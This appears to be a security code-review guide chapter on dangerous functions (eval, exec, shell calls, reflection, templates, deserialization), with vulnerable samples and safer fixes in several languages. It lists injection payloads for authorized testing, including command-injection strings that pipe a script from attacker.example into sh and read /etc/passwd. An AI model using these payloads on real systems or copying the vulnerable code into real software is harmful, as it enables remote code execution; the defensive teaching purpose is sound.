---
title: Review Dangerous Functions
keywords:
  - security code review
  - dangerous functions
  - eval
  - code injection
  - dynamic execution
  - CWE-95
description: How to read code for dangerous functions such as eval, exec, and dynamic code loading where attacker-controlled input may execute arbitrary code.
---

## 4.35 - Review Dangerous Functions

Dangerous functions execute strings as code, spawn shells, or load untrusted modules at runtime. Review any call to `eval`, dynamic compilation, reflection-based invocation, and shell execution with user-influenced arguments. Trace input from the HTTP layer to these sinks and ask whether a safer API exists.

## What This Vulnerability Is

Some language and platform APIs execute arbitrary code or commands when passed a string. `eval()` in JavaScript and Python, `Function()` constructors, script engines, and shell invocation with concatenated arguments are common examples. When attacker-controlled data reaches these functions, the impact is often full code execution in the application's process context.

The unsafe assumption is that the string passed to a dangerous function is always trusted or sanitized. Even partial control—choosing a property name, a template fragment, or a file path—may be enough to escape intended behavior. Dangerous functions are review signals: they do not always mean vulnerability, but they always warrant tracing data flow and questioning necessity. This pattern relates to [CWE-95](https://cwe.mitre.org/data/definitions/95.html) (Improper Neutralization of Directives in Dynamically Evaluated Code) and [CWE-78](https://cwe.mitre.org/data/definitions/78.html) for shell invocation.

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Formula evaluators, rule engines, admin scripting, plugin loaders, template logic |
| **Dynamic execution** | `eval`, `exec`, `compile`, `Function(`, `setTimeout` with string arguments |
| **Shell invocation** | `subprocess` with `shell=True`, `/bin/sh -c`, `Runtime.exec` with concatenated commands |
| **Reflection** | `Class.forName`, `importlib`, user-controlled method or class names at runtime |
| **Plugin loading** | JARs, `.so` files, or scripts loaded from user-upload paths |
| **Template logic** | Jinja2 unsafe extensions, Velocity user templates, server-side scriptlets |
| **Deserialization overlap** | Native object deserialization treated as dynamic instantiation (see deserialization chapter) |

## Attack Payloads

Use these in authorized tests when input reaches dynamic execution or shell invocation. Syntax varies by language and sandbox—confirm the sink before relying on a single payload.

### Pattern 1: Python expression injection (`eval` / `exec`)

```python
__import__('os').system('id')
().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')
open('/etc/passwd').read()
```

### Pattern 2: JavaScript code injection

```javascript
process.mainModule.require('child_process').execSync('id')
global.process.mainModule.constructor._load('child_process').exec('id')
Function('return this')().constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

### Pattern 3: Shell metacharacters (when `shell=True` or `-c`)

```text
report.pdf; curl https://attacker.example/s.sh | sh
$(whoami)
`id`
```

### Pattern 4: Template injection (server-side)

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${7*7}  # probe for expression evaluation
```

### Pattern 5: Reflection / dynamic class loading

```text
className=java.lang.Runtime
module=../../../evil
plugin=attacker.jar
```

### Pattern 6: Pickle / Java deserialization gadgets

Pickle and Java native serialization require crafted binary payloads (ysoserial, pickle gadgets)—test only in isolated lab environments with known gadget chains on the classpath.

## Language-Specific Sinks and Dangerous APIs

### Python

```python
eval(user_input)
exec(code)
compile(source, "<string>", "exec")
pickle.loads(data)
yaml.load(data)  # unsafe loader
subprocess.run(cmd, shell=True)
importlib.import_module(user_module)
```

Also review: `simpleeval` misconfiguration, Jinja2 `Environment(autoescape=False)` with user templates, `ast.literal_eval` on untrusted but crafted literals.

### Java

```java
scriptEngine.eval(userExpr);
Runtime.getRuntime().exec("cmd " + userInput);
ProcessBuilder("/bin/sh", "-c", userCmd);
Class.forName(className).getMethod(method).invoke(...);
ObjectInputStream.readObject();
MethodHandles.lookup().findClass(userClass);
```

Nashorn/GraalJS `ScriptEngine`, Spring SpEL `parseExpression` on user input, MyBatis `${}` (string substitution).

### C#

```csharp
CSharpScript.EvaluateAsync(userInput);
CodeDomProvider.CompileAssemblyFromSource(..., userCode);
Process.Start("cmd.exe", $"/c {userCmd}");
BinaryFormatter.Deserialize(stream);
Assembly.Load(userBytes);
```

Also review: Roslyn scripting, `DataContractSerializer` with known types expanded from user input.

### JavaScript (Node.js)

```javascript
eval(expr);
new Function('return ' + userCode)();
vm.runInNewContext(userCode);  // insufficient isolation alone
child_process.exec(`cmd ${userInput}`);
setTimeout(userString, 100);
require(userPath);
```

### Go

```go
vm.Run(userJavaScript)  // otto, goja
exec.Command("sh", "-c", userCmd)
plugin.Open(userSuppliedPath)
text/template.Execute(tmpl, userData)  // when tmpl is user-controlled
```

### Shell

```bash
eval "$user_filter"
source "$uploaded_script"
bash -c "$user_cmd"
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request
import pickle

app = Flask(__name__)

@app.route("/calc")
def calc():
    expr = request.args.get("expr", "")
    # Attacker-controlled expression executes as Python code
    return str(eval(expr))

@app.route("/import", methods=["POST"])
def import_state():
    # pickle.loads on request body — equivalent to arbitrary code execution
    state = pickle.loads(request.get_data())
    return process(state)

def run_report(cmd: str):
    # shell=True with interpolated user input
    subprocess.run(f"reportgen {cmd}", shell=True, check=True)
```

## Step-by-Step Review Walkthrough

1. **Search dynamic execution APIs.** Look for `eval`, `exec`, `compile`, `Function(`, and string-argument timers across the codebase.
2. **Review template engines.** Inspect Jinja2 `Environment` with unsafe extensions, Velocity with user templates, and logic in client-side templates.
3. **Inspect deserialization.** Treat native object deserialization as a dangerous operation when input crosses trust boundaries.
4. **Trace reflection and dynamic loading.** Follow `Class.forName`, `importlib`, `Assembly.Load`, and plugin systems loading user-supplied artifacts.
5. **Check shell-outs.** Review `subprocess` with `shell=True`, `/bin/sh -c`, and `Runtime.exec` with concatenated commands.
6. **Follow HTTP-to-sink paths.** Confirm whether request parameters, file uploads, or message queue payloads reach dangerous calls.
7. **Question necessity.** Ask whether parsing, mapping, or a sandboxed DSL can replace general code execution.

## Risk Impact Analysis

**Remote code execution.** User input reaching `eval` or equivalent APIs typically grants full control within the application process.

**Server compromise.** Shell invocation with interpolated input may spawn arbitrary OS commands with the service account's privileges.

**Lateral movement.** Compromised application hosts become launch points for internal network access and credential theft.

**Data exfiltration.** Dynamic execution can read databases, environment variables, and cloud metadata endpoints.

**Supply chain via plugins.** Loading user-supplied modules extends trust to unreviewed code at runtime.

## Vulnerable Examples in Other Languages

### Java

```java
public Object runUserFormula(String expr) throws ScriptException {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
    return engine.eval(expr); // user-controlled expression
}

public void runCommand(String filename) throws IOException {
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");
}

public Object importState(byte[] body) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(body));
    return ois.readObject(); // native deserialization — arbitrary code execution
}
```

### C#

```csharp
public object Evaluate(string userInput)
{
    return CSharpScript.EvaluateAsync(userInput).Result;
}

public void RunReport(string reportId)
{
    Process.Start("cmd.exe", $"/c reportgen {reportId}");
}
```

### JavaScript

```javascript
app.get('/calc', (req, res) => {
  const expr = req.query.expr;
  res.send(String(eval(expr))); // user-controlled expression
});

function runPlugin(userCode, payload) {
  return new Function('data', userCode)(payload); // arbitrary JS execution
}

setTimeout(req.query.code, 100); // string argument treated as code
```

### Shell

```bash
#!/bin/bash
# App shell-outs with interpolated user input
filename="$1"
convert "$filename" output.pdf   # filename='file.jpg; curl attacker.com/s.sh | sh'

reportgen $REPORT_ID            # REPORT_ID from HTTP param without quoting
```

### Go

```go
func runFilter(code string, data map[string]interface{}) interface{} {
    vm := otto.New()
    vm.Set("data", data)
    val, _ := vm.Run(code) // user-supplied JavaScript
    return val
}

func runReport(reportID string) error {
    cmd := exec.Command("sh", "-c", "reportgen "+reportID)
    return cmd.Run()
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Never `eval` user input. Parse with safe alternatives and run subprocess without a shell.

```python
import ast
import json
import subprocess
from simpleeval import simple_eval

ALLOWED_NAMES = {"abs": abs, "min": min, "max": max}

@app.route("/calc")
def calc():
    expr = request.args.get("expr", "")
    # simpleeval evaluates expressions without arbitrary code execution
    result = simple_eval(expr, names=ALLOWED_NAMES)
    return str(result)

@app.route("/import", methods=["POST"])
def import_state():
    data = json.loads(request.get_data())
    state = ImportState.model_validate(data)  # pydantic schema validation
    return process(state)

def run_report(report_id: str):
    if report_id not in ALLOWED_REPORTS:
        raise ValueError("invalid report")
    subprocess.run(["reportgen", report_id], shell=False, check=True)
```

Use [ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval) only for trusted literal structures. Prefer [json.loads](https://docs.python.org/3/library/json.html#json.loads) over `pickle` for untrusted data.

### Java

Avoid ScriptEngine on user input. Use ProcessBuilder with separate arguments.

```java
public Object runUserFormula(String expr) {
    throw new UnsupportedOperationException("User formulas disabled");
}

public void runCommand(String filename) throws IOException {
    Path safe = uploadDir.resolve(Path.of(filename).getFileName()).normalize();
    if (!safe.startsWith(uploadDir)) {
        throw new SecurityException("invalid filename");
    }
    new ProcessBuilder("convert", safe.toString(), "output.pdf").start();
}
```

Use Jackson or Gson for data parsing, not Java serialization, on untrusted input. See [ProcessBuilder](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html).

### C#

If scripting is required, run in an isolated sandbox with strict assembly allowlists. Avoid unsafe deserializers.

```csharp
public ImportState LoadState(string json)
{
    return JsonSerializer.Deserialize<ImportState>(json)
        ?? throw new JsonException("Invalid payload");
}

public void RunReport(string reportId)
{
    if (!AllowedReports.Contains(reportId))
        throw new ArgumentException("Invalid report", nameof(reportId));

    Process.Start(new ProcessStartInfo
    {
        FileName = "reportgen",
        ArgumentList = { reportId },
        UseShellExecute = false
    });
}
```

Use [System.Text.Json](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview) instead of `BinaryFormatter`. Pass arguments via [ProcessStartInfo.ArgumentList](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist).

### Go

Avoid JavaScript interpreters on user code. Use fixed binaries with separate args.

```go
func runReport(reportID string) error {
    if !allowedReports[reportID] {
        return fmt.Errorf("invalid report")
    }
    cmd := exec.Command("reportgen", reportID)
    cmd.Env = nil
    return cmd.Run()
}
```

Unmarshal with [encoding/json](https://pkg.go.dev/encoding/json) into typed structs. Validate hostnames and paths with allowlists before any `exec.Command`.

## Verify During Review

- User-controlled input does not reach `eval`, equivalent dynamic execution, or unsafe deserialization APIs.
- Shell commands use argument arrays and allowlists; no `shell=True` or `sh -c` with interpolated user data.
- Plugin and template features use restricted DSLs or admin-only authoring with code review, not open user scripting.
- Dangerous functions in legacy modules are scheduled for removal or isolated from production routes.
- Static analysis and security tests cover known dangerous API usage in the codebase.

## Reference

- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Python ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval)
- [Python subprocess security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [Java ProcessBuilder](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html)
- [System.Text.Json documentation](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview)
- [Go exec.Command](https://pkg.go.dev/os/exec#Command)
